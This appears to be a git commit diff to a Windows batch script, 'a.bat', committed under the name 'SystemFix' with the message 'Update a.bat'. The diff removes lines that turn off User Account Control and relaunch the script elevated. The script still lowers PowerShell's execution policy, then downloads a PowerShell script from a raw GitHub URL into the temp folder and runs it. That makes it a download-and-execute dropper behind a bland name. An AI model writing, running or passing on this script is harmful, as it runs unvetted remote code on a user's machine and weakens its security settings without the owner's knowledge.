5aa496049aee98bf08d187b57ddba95a497e557c
SystemFix <ab7132311@gmail.com>
2025-01-08 01:38:59 +0500

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,15 +1,7 @@
 @echo off
 if "%1" == "hidden" goto run
 
-powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
-powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0"
-
-powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -Verb RunAs"
-exit /b
-
 :run
 powershell -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Force"
-
 powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -OutFile \"%TEMP%\a.ps1\" -UseBasicParsing"
-
 powershell -NoProfile -File "%TEMP%\a.ps1"
